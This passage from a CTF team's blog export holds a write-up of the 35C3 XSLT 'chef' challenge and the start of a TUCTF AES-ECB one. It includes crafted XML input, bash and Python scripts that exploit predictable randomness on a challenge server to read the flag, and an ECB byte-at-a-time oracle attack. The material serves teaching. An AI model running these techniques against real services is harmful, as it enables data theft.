EXEC:/usr/bin/xalan -xsl /home/user/challenge.min.xslt' Since I forwarded the port 1337 from the host to the container port 1337 with the parameter -p in the docker run command. Now I could connect from the host directly to the localhost with ncat localhost 1337 without getting any errors from the server. XML format analysisSo it’s time to start analysing the challenge.min.xslt file, this file was minimized so I searched for an online tool to beautify to make it more readable, so lets start with the beginning: 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:math=\"http://exslt.org/math\" xmlns:exsl=\"http://exslt.org/common\" exclude-result-prefixes=\"xsl math exsl\"&gt; &lt;xsl:template match=\"/meal\"&gt; &lt;all&gt; &lt;xsl:if test=\"count(//plate) &gt; 300\"&gt; &lt;xsl:message terminate=\"yes\"&gt;You do not have enough money to buy that much food&lt;/xsl:message&gt; &lt;/xsl:if&gt; &lt;xsl:variable name=\"chef-drinks\"&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;/xsl:variable&gt; &lt;xsl:call-template name=\"consume-meal\"&gt; &lt;xsl:with-param name=\"chef-drinks\" select=\"exsl:node-set($chef-drinks)//value\"/&gt; &lt;xsl:with-param name=\"food-eaten\" select=\"1\"/&gt; &lt;xsl:with-param name=\"course\" select=\"course[position() = 1]/plate\"/&gt; &lt;xsl:with-param name=\"drinks\" select=\"state/drinks\"/&gt; &lt;/xsl:call-template&gt; &lt;/all&gt; &lt;/xsl:template&gt; &lt;xsl:template name=\"consume-meal\"&gt; &lt;xsl:param name=\"chef-drinks\"/&gt; &lt;xsl:param name=\"food-eaten\"/&gt; &lt;xsl:param name=\"course\"/&gt; &lt;xsl:param name=\"drinks\"/&gt;... So if you don’t know about xslt is a language that parses a xml document, and with that you can do things like converting that xml into html in a very easy way. Right at the beginning we can see what kind of structure of xml they want : 1&lt;xsl:template match=\"/meal\"&gt; The match parameter will look in the xml document from the root for a tag , from this you can look up into the elements inside of it. Now right after setting this an variable is declared with some random numbers (drinks), variables like in any other language are used to store values to be used later, in xslt is no different. 12345678910111213141516171819&lt;xsl:variable name=\"chef-drinks\"&gt;&lt;value&gt;&lt;xsl:variable name=\"chef-drinks\"&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt; &lt;value&gt; &lt;xsl:value-of select=\"round(math:random() * 4294967296)\"/&gt; &lt;/value&gt;&lt;/xsl:variable&gt; This random implementation looks already suspicious, looks it it doesn’t even have any kind of seed, and if it has a seed it probably is the current time. Now right after declaring this drinks with random numbers it does a template call as you can see bellow: 123456&lt;xsl:call-template name=\"consume-meal\"&gt; &lt;xsl:with-param name=\"chef-drinks\" select=\"exsl:node-set($chef-drinks)//value\"/&gt; &lt;xsl:with-param name=\"food-eaten\" select=\"1\"/&gt; &lt;xsl:with-param name=\"course\" select=\"course[position() = 1]/plate\"/&gt; &lt;xsl:with-param name=\"drinks\" select=\"state/drinks\"/&gt;&lt;/xsl:call-template&gt; You can think of this like it’s a function call in a normal language, the name of the function is consume-meal and its arguments are right below, the declaration of consume-meal is just below this code, but before doing that lets analyse the selects for the arguments since they give us hints about how the xml document should be built. So for the first parameter: 1&lt;xsl:with-param name=\"chef-drinks\" select=\"exsl:node-set($chef-drinks)//value\"/&gt; so exsl:node-set will just grab all the values from the variable $chef-drinks and pass it into the function as it was an array, explaining the //value part, the first / is referencing the the tag of the variable &lt;xsl:variable name=”chef-drinks”&gt; and the /value is referencing to the \\&lt;value> tag, this extracts the variable random number drinks and sets them as an array to be used in the template “function”. So for the second parameter: 1&lt;xsl:with-param name=\"food-eaten\" select=\"1\"/&gt; The food-eaten parameter is initialized into 1 and this an integer variable that ill keep track of the number of plates you consume, after analysing consume-meal you will see that there’s a limit of plates you can eat that’s why they are tracking this number here. So for the third parameter: 1&lt;xsl:with-param name=\"course\" select=\"course[position() = 1]/plate\"/&gt; Since we are inside a template tag match meal, by analysing this select it looks it inside the tag meal, our xml will need to have a course tag (\\&lt;course>) and plate tags inside of it, this works like a hierarchy from the left to right, the part [position() = 1] is just selecting the first plate inside the course tag, an example xml could be like this: 1234567891011&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;meal&gt; &lt;course&gt; &lt;plate&gt; 1st plate &lt;/plate&gt; &lt;plate&gt; 2nd plate &lt;/plate&gt; &lt;/course&gt;&lt;/meal&gt; So course[position() = 1] will select the first plate inside course so the parameter course will be set into : 123&lt;plate&gt; 1st plate&lt;/plate&gt; So for the fourth parameter: 1&lt;xsl:with-param name=\"drinks\" select=\"state/drinks\"/&gt; Once again this will select all the drinks declared inside state and drinks tags, so two new tags will needed to be added inside meal tag. Based on the information we have now an example xml can be build like this:1234567891011121314&lt;meal&gt; &lt;course&gt; &lt;plate&gt; 1st plate &lt;/plate&gt; &lt;plate&gt; 2nd plate &lt;/plate&gt; &lt;/course&gt; &lt;state&gt; &lt;drinks&gt;1&lt;/drinks&gt; &lt;drinks&gt;2&lt;/drinks&gt; &lt;/state&gt;&lt;/meal&gt; And now finally analysing the “function” consume-meal: 1234567891011&lt;xsl:template name=\"consume-meal\"&gt; &lt;xsl:param name=\"chef-drinks\"/&gt; &lt;xsl:param name=\"food-eaten\"/&gt; &lt;xsl:param name=\"course\"/&gt; &lt;xsl:param name=\"drinks\"/&gt; &lt;xsl:if test=\"$food-eaten &gt; 30000\"&gt; &lt;xsl:message terminate=\"yes\"&gt;You ate too much and died&lt;/xsl:message&gt; &lt;/xsl:if&gt; &lt;xsl:if test=\"count($drinks) &gt; 200\"&gt; &lt;xsl:message terminate=\"yes\"&gt;You cannot drink that much&lt;/xsl:message&gt; &lt;/xsl:if&gt; Right at the beginning the parameters of the “function” are being declared, and two ifs are checking if we ate more than 30k plates or more than 200 drinks, so if we eat of drink more than that , the function terminates and “prints” a message to the user. After this we come up with a new if, it checks if the number of plates is higher than 0, and a new tag xsl:choose, which is like a switch-case from the c language the when tags are the case clauses, and it only enters it if the condition is true of course. Right before the choose two variables are being initialized, c and r , the variable c will get the head (first element) of the plate list inside the tag course, and r will be setted into the rest plates of the list, position()&gt;1 will select all the plates above the position 1. 12345678910111213141516171819202122232425262728293031323334353637&lt;xsl:if test=\"count($course) &gt; 0\"&gt; &lt;xsl:variable name=\"c\" select=\"$course[1]\" /&gt; &lt;xsl:variable name=\"r\" select=\"$course[position()&gt;1]\" /&gt; &lt;xsl:choose&gt; &lt;xsl:when test=\"count($c/宫保鸡丁) = 1\"&gt; &lt;xsl:message&gt; &lt;chef-drinks&gt; &lt;xsl:copy-of select=\"$chef-drinks\"/&gt; &lt;/chef-drinks&gt; &lt;/xsl:message&gt; &lt;xsl:message&gt; &lt;drinks&gt; &lt;xsl:copy-of select=\"$drinks\"/&gt; &lt;/drinks&gt; &lt;/xsl:message&gt; &lt;xsl:call-template name=\"consume-meal\"&gt; &lt;xsl:with-param name=\"chef-drinks\" select=\"$chef-drinks\"/&gt; &lt;xsl:with-param name=\"food-eaten\" select=\"$food-eaten + 1\"/&gt; &lt;xsl:with-param name=\"course\" select=\"$r\"/&gt; &lt;xsl:with-param name=\"drinks\" select=\"$drinks\"/&gt; &lt;/xsl:call-template&gt; &lt;/xsl:when&gt; &lt;xsl:when test=\"count($c/paella) = 1\"&gt; &lt;xsl:variable name=\"newdrinks\"&gt; &lt;value&gt; &lt;xsl:value-of select=\"$c/paella + 0\"/&gt; &lt;/value&gt; &lt;xsl:copy-of select=\"$drinks\"/&gt; &lt;/xsl:variable&gt; &lt;xsl:call-template name=\"consume-meal\"&gt; &lt;xsl:with-param name=\"chef-drinks\" select=\"$chef-drinks\"/&gt; &lt;xsl:with-param name=\"food-eaten\" select=\"$food-eaten + 1\"/&gt; &lt;xsl:with-param name=\"course\" select=\"$r\"/&gt; &lt;xsl:with-param name=\"drinks\" select=\"exsl:node-set($newdrinks)//value\"/&gt; &lt;/xsl:call-template&gt; &lt;/xsl:when&gt;... Clause AnalysisI will only explain 3 clauses, since my solution only uses 3 it makes sense to only explain these ones. Analysing the first case-clause: 1&lt;xsl:when test=\"count($c/宫保鸡丁) = 1\"&gt; We can already update out XML into this, since $c is a plate we will need a new tag which are named into this weird names, if we want to enter into this clause: 123456789101112131415161718&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;meal&gt; &lt;course&gt; &lt;plate&gt; &lt;宫保鸡丁&gt;4&lt;/宫保鸡丁&gt; &lt;/plate&gt; &lt;/course&gt; &lt;state&gt; &lt;drinks&gt; 1 &lt;/drinks&gt; &lt;drinks&gt; 1 &lt;/drinks&gt; &lt;/state&gt;&lt;/meal&gt; Now analysing the code when we enter this clause 宫保鸡丁 , as we can see below it only prints the current chef drinks and the current drinks, in the end is recalling consume-meal, this will form a recursive function that will iterate all the plates created in the course tag, as we can see the parameters passed the only thing that changes is the $course the $r is passed into this parameter so we don’t get stuck in a infinite loop which is the usually the thing you do when creating a recursive function, oh the other change is obvious the incrementing of the variable food-eaten. 123456789101112131415161718&lt;xsl:when test=\"count($c/宫保鸡丁) = 1\"&gt; &lt;xsl:message&gt; &lt;chef-drinks&gt; &lt;xsl:copy-of select=\"$chef-drinks\"/&gt; &lt;/chef-drinks&gt; &lt;/xsl:message&gt; &lt;xsl:message&gt; &lt;drinks&gt; &lt;xsl:copy-of select=\"$drinks\"/&gt; &lt;/drinks&gt; &lt;/xsl:message&gt; &lt;xsl:call-template name=\"consume-meal\"&gt; &lt;xsl:with-param name=\"chef-drinks\" select=\"$chef-drinks\"/&gt; &lt;xsl:with-param name=\"food-eaten\" select=\"$food-eaten + 1\"/&gt; &lt;xsl:with-param name=\"course\" select=\"$r\"/&gt; &lt;xsl:with-param name=\"drinks\" select=\"$drinks\"/&gt; &lt;/xsl:call-template&gt;&lt;/xsl:when&gt; Analysing the second case-clause: 1234567891011&lt;xsl:when test=\"count($c/दाल) = 1\"&gt; &lt;xsl:if test=\"count($chef-drinks) = 0\"&gt; &lt;xsl:copy-of select=\"document('/flag')\"/&gt; &lt;/xsl:if&gt; &lt;xsl:call-template name=\"consume-meal\"&gt; &lt;xsl:with-param name=\"chef-drinks\" select=\"$chef-drinks\"/&gt; &lt;xsl:with-param name=\"food-eaten\" select=\"$food-eaten + 1\"/&gt; &lt;xsl:with-param name=\"course\" select=\"$r\"/&gt; &lt;xsl:with-param name=\"drinks\" select=\"$drinks\"/&gt; &lt;/xsl:call-template&gt;&lt;/xsl:when&gt; Now analysing the code when we enter this clause दाल, we can see it will print and select a document “/flag” which will contain the flag we need, perhaps we need satisfy the condition count($chef-drinks) = 0, the chef-drinks is initialized with 5 random numbers (chef-drinks) so we need to find a clause that removes items from $chef-drinks so we reach the count of 0. Analysing the third case-clause: 12345678910111213&lt;xsl:when test=\"count($c/Борщ) = 1\"&gt; &lt;xsl:variable name=\"arg0\"&gt; &lt;value&gt; &lt;xsl:value-of select=\"$drinks[1] + 0\"/&gt; &lt;/value&gt; &lt;/xsl:variable&gt; &lt;xsl:call-template name=\"consume-meal\"&gt; &lt;xsl:with-param name=\"chef-drinks\" select=\"$chef-drinks[position() &gt; 1 or $chef-drinks[1] != $arg0]\"/&gt; &lt;xsl:with-param name=\"food-eaten\" select=\"$food-eaten + 1\"/&gt; &lt;xsl:with-param name=\"course\" select=\"$r\"/&gt; &lt;xsl:with-param name=\"drinks\" select=\"$drinks[position() &gt; 1]\"/&gt; &lt;/xsl:call-template&gt;&lt;/xsl:when&gt; Now analysing the code when we enter this clause Борщ, the first drink in $drinks (drinks declared inside the state tag) is setted into arg0 variable, now analysing the recalling parameters we can see chef-drinks is being modified: 1&lt;xsl:with-param name=\"chef-drinks\" select=\"$chef-drinks[position() &gt; 1 or $chef-drinks[1] != $arg0]\"/&gt; The select will remove the head of $chef-drinks based on a condition position() &gt; 1 or $chef-drinks[1] != $arg0, so to make this condition work we need either for both condition to be both false, or to at least position() &gt; 1 to be true, unfortunately position() &gt; 1 will never be true in this situation because position() will return the current position order in xml and since it’s not associated into any tag it will always return 1 because is associated to the root element meal, 1 &gt; 1 is always false so we need to make $chef-drinks[1] != $arg0 to return false as well, the $chef-drinks are declared as random in the begining but as I said before the randomness is implemented in a wrong way, if we do fast requests we can get the same numbers as we can analyse it here: 123456789101112131415$ ncat 35.246.237.11 1 &lt; solution.xmlReading input document from stdin...XSLT message: 2790719341256416733922614505473645015994193916258 (Occurred in entity 'file:///home/user/challenge.min.xslt', at line 1, column 1.)Source tree node: meal.XSLT message: (Occurred in entity 'file:///home/user/challenge.min.xslt', at line 1, column 1.)Source tree node: meal.&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;all/&gt;⏎ $ ncat 35.246.237.11 1 &lt; solution.xmlReading input document from stdin...XSLT message: 2790719341256416733922614505473645015994193916258 (Occurred in entity 'file:///home/user/challenge.min.xslt', at line 1, column 1.)Source tree node: meal.XSLT message: (Occurred in entity 'file:///home/user/challenge.min.xslt', at line 1, column 1.)Source tree node: meal.&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;all/&gt; The only case-clause that prints the $chef-drinks for us is 宫保鸡丁 , so the xml used to print the samples above was: 123456789101112&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;meal&gt; &lt;course&gt; &lt;plate&gt; &lt;宫保鸡丁&gt;4&lt;/宫保鸡丁&gt; &lt;/plate&gt; &lt;/course&gt; &lt;state&gt; &lt;/state&gt;&lt;/meal&gt; But we ran into a problem here right? as you can see it prints chef-drinks into a single number, 2790719341256416733922614505473645015994193916258, it looks like the message printing is joining all the 5 elements into a one number, for example if the random numbers were 1,2,3,4,5 the number that would be printed is 12345 , the problem is sometimes each drink will have a different length and we don’t have any way to tell which length each element has, so I decided to analyse a lot of occurrences. To make sure the length of each $chef-drink I decided to modify a little bit the challenge.min.xslt file in my docker container so I could print those numbers as well, so right after the declared parameters in consume-meal I added this line: 1&lt;xsl:copy-of select=\"$chef-drinks\" /&gt; So at every iteration of consumer-meals the $chef-drinks will be printed like this: 1234567$ ncat localhost 1337 &lt; solution.xmlReading input document from stdin...XSLT message: 993763458325537011481963110810288894381216985659 (Occurred in entity 'file:///home/user/challenge.min.xslt', at line 65, column 65.)Source tree node: meal.XSLT message: (Occurred in entity 'file:///home/user/challenge.min.xslt', at line 70, column 70.)Source tree node: meal.&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;all&gt;&lt;value&gt;993763458&lt;/value&gt;&lt;value&gt;3255370114&lt;/value&gt;&lt;value&gt;819631108&lt;/value&gt;&lt;value&gt;1028889438&lt;/value&gt;&lt;value&gt;1216985659&lt;/value&gt;&lt;value&gt;993763458&lt;/value&gt;&lt;value&gt;3255370114&lt;/value&gt;&lt;value&gt;819631108&lt;/value&gt;&lt;value&gt;1028889438&lt;/value&gt;&lt;value&gt;1216985659&lt;/value&gt;&lt;/all&gt; So after this I did this bash script:123456##35.246.237.11 1for i in &#123;1..1000&#125;dovar1=$(ncat localhost 1337 &lt; solution.xml | grep -Poh '\\d&#123;4,&#125;')echo $var1;done Running it into a file: 1$ bash rofl.sh &gt; out So after saving the outputs into a file I got something like this: 12345678910111213141516171819202122232425262728293031323334353637383940411326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 31789722571326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 317897225772103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 289053759972103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599.... So after this I wrote a python script that reads this outputs and counts the length every number: 1234with open('out','r') as f: lines = f.readlines() for l in lines: print map(len,l.strip().split(' ')[:-5]) The output is something like this:123456789101112131415161718....[47, 9, 10, 10, 9, 9][47, 9, 10, 10, 9, 9][47, 9, 10, 10, 9, 9][47, 9, 10, 10, 9, 9][47, 9, 10, 10, 9, 9][50, 10, 10, 10, 10, 10][50, 10, 10, 10, 10, 10][50, 10, 10, 10, 10, 10][46, 10, 9, 8, 9, 10][46, 10, 9, 8, 9, 10][46, 10, 9, 8, 9, 10][46, 10, 9, 8, 9, 10][50, 10, 10, 10, 10, 10][50, 10, 10, 10, 10, 10][50, 10, 10, 10, 10, 10][50, 10, 10, 10, 10, 10]... From the outputs I analysed that when the single number had a length of 50, the chef-drinks would always have an equal length of 10, the other lengths diverged into different things so I decided to only extract the numbers if the single number has a length of 50. So now we need to create a xml file according with the info we just got, but it needs to be done dynamically at least of the part of the drinks, because we need to be really fast on the requests to get the same number it’s only possible if you do in a program. So the structure the xml solution we want to form needs to be something like this: 1234567891011121314151617181920212223242526272829303132&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;meal&gt; &lt;course&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;दाल&gt;4&lt;/दाल&gt; &lt;/plate&gt; &lt;/course&gt; &lt;state&gt; &lt;drinks&gt;random_number_extracted&lt;/drinks&gt; &lt;drinks&gt;random_number_extracted&lt;/drinks&gt; &lt;drinks&gt;random_number_extracted&lt;/drinks&gt; &lt;drinks&gt;random_number_extracted&lt;/drinks&gt; &lt;drinks&gt;random_number_extracted&lt;/drinks&gt; &lt;/state&gt;&lt;/meal&gt; We need 5 plates of Борщ because we need to reduce the count of chef-drinks to zero, and each iteration of Борщ will reduce the $chef-drinks by one, the final plate दाल is to finally print the flag, so I wrote two scripts to do this the first one is a simplified version of my bash script: 12var1=$(ncat 35.246.237.11 1 &lt; solution.xml | grep -Poh '\\d&#123;4,&#125;')echo $var1; Before the python script I prepared this xml file so I didn’t need to create every tag in python:12345678910111213141516171819202122232425262728&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;meal&gt; &lt;course&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;Борщ&gt;1&lt;/Борщ&gt; &lt;/plate&gt; &lt;plate&gt; &lt;दाल&gt;4&lt;/दाल&gt; &lt;/plate&gt; &lt;/course&gt; &lt;state&gt; &lt;/state&gt;&lt;/meal&gt; And finally my python script:1234567891011121314151617181920# -*- coding: utf-8 -*-import subprocessimport osimport xml.etree.ElementTree as ETtree = ET.parse('solution2.xml')root = tree.getroot()for x in xrange(100): a = subprocess.check_output(['bash','rofl.sh']).strip().split(' ') if (len(a[0]) == 50): state = root.getchildren()[1] for i in range(0,50,10): b = ET.SubElement(state,'drinks') b.text = a[0][i:i+10] break# create a new XML file with the resultsmydata = \"&lt;?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?&gt;\\n\"+ET.tostring(root, encoding=\"utf-8\") +'\\n\\n' myfile = open(\"items2.xml\", \"w\") myfile.write(mydata) And now running it all: 123$ bash -c \"python juggle.py &amp;&amp; ncat 35.246.237.11 1 &lt; items2.xml\"Reading input document from stdin...&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;all&gt;&lt;flag&gt;35C3_The_chef_gives_you_his_compliments&lt;/flag&gt;&lt;/all&gt; The flag was 35C3_The_chef_gives_you_his_compliments","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"35C3","slug":"35C3","permalink":"https://teamrocketist.github.io/tags/35C3/"},{"name":"random","slug":"random","permalink":"https://teamrocketist.github.io/tags/random/"},{"name":"xslt","slug":"xslt","permalink":"https://teamrocketist.github.io/tags/xslt/"}]},{"title":"[Crypto] TUCTF 2018 - AESential Lesson","slug":"Crypto-TUCTF-2018-AESential-Lesson","date":"2018-11-26T06:51:39.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2018/11/26/Crypto-TUCTF-2018-AESential-Lesson/","link":"","permalink":"https://teamrocketist.github.io/2018/11/26/Crypto-TUCTF-2018-AESential-Lesson/","excerpt":"","text":"AESential Lesson465Thought I’d give you an essential lesson to how you shouldn’t get input for AES in ECB mode.nc 18.218.238.95 12345 Learning by the description we can already know the cryptography used here is AES ECB mode, we are provided a file with the encryption process: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/env python2from Crypto.Cipher import AESfrom select import selectimport sysINTRO = \"\"\"Lol. You think you can steal my flag?I\\'ll even encrypt your input for you,but you can\\'t get my secrets!\"\"\"flag = \"REDACTED\" # TODO Redact thiskey = \"REDACTED\" # TODO Redact thisif __name__ == '__main__': padc = 'REDACTED' #TODO Redact this assert (len(flag) == 32) and (len(key) == 32) cipher = AES.new(key, AES.MODE_ECB) sys.stdout.write(INTRO) sys.stdout.flush() while True: try: sys.stdout.write('Enter your text here: ') sys.stdout.flush() rlist, _, _ = select([sys.stdin], [], []) inp = '' if rlist: inp = sys.stdin.readline().rstrip('\\n') plaintext = inp + flag l = len(plaintext) padl = (l // 32 + 1)*32 if l % 32 != 0 else 0 plaintext = plaintext.ljust(padl, padc) #print plaintext sys.stdout.write('Here\\'s your encrypted text:\\n&#123;&#125;\\n\\n'.format((cipher.encrypt(plaintext)).encode('hex'))) except KeyboardInterrupt: exit(0) By looking at the script we can already see, the flag has 32 bytes of size, the key as well, the encryption method processes as follows, since it’s ECB we know the plaintext will be split in blocks of 16 bytes and for each block will be applied the AES encryption function with the key provided in the file: Before the encryption we can see the program asks for an input to be encrypted, the input is concatenated with the flag and then it’s applied some padding to fill the last blocks, for example imagine the padding character is 1, the sent input is ‘A’ and the respective flag is ‘TUCTF{MY_B34UT1FULL_FL4G_L0L_XD}’ the padding will be applied to the plaintext as follows: 12Block1 Block2 Block3 Block4ATUCTF&#123;MY_B34UT1 FULL_FL4G_L0L_XD &#125;111111111111111 1111111111111111 After this as described before the encryption is applied to each block with a key, now we can perform an attack without needing the key, we can bruteforce the flag byte by byte, imagine we sent an input of 15 ‘A’s the first block of the plaintext and ciphertext will be as follows (The key in this examples is a random key chosen by me): 12345678910PlaintextBlock1 Block2 Block3 Block4 AAAAAAAAAAAAAAAT UCTF&#123;MY_B34UT1FU L_FL4G_L0L_XD&#125;1 1111111111111111CiphertextBlock1 Block2 Block382b094debf0605ef9d46ad671ac3605d 08663b2c2a83bd539e14e2ea671035c4 b2140d0e9125ca1de2cd1ea85d21ae7e Block4e845fa5520b78d20bdd0ff93339df9fe Now we know that input + 1st_char_of_the_flag its corresponding ciphertext is the 1st block, now we just need to send the inputs for every character possible until we match the 1st ciphertext we got with the input of 14 “A”s: 123456Plain Block1 Cipher Block1AAAAAAAAAAAAAAAA 207ca0ee7f5bdb8897caa7b1f8ff2157AAAAAAAAAAAAAAAB 9884f8e45e5ea527ca6c9b090bef5e64AAAAAAAAAAAAAAAC e422f4ff06175cfe7e00b3002bd8b464 .... .......AAAAAAAAAAAAAAAT 82b094debf0605ef9d46ad671ac3605d As we can see from above we matched the 82b094debf0605ef9d46ad671ac3605d, we now know the first character of the flag is T, well we already knew that! but this was just a confirmation :), using this method we can get the first 16 bytes of the flag, but how can we get the last 16 ? For this we need to find the padding character we can do this by sending an A to the server, imagine the padding character is _: 123456789PlaintextBlock1 Block2 Block3 Block4ATUCTF&#123;MY_B34UT1 FULL_FL4G_L0L_XD &#125;_______________ ________________CiphertextBlock1 Block2 Block3 7a80f91bcf406446befb10e0720b8a7d ece296fd74e495dc5b2890596777f3eb 2a5831079c0a0591601f25278f4623f3 Block4e845fa5520b78d20bdd0ff93339df9fe Now we want to extract the block 3 or the block 4 cipher, block 3 also works because we actually know that the last byte of the flag is }, so making an example using block 3 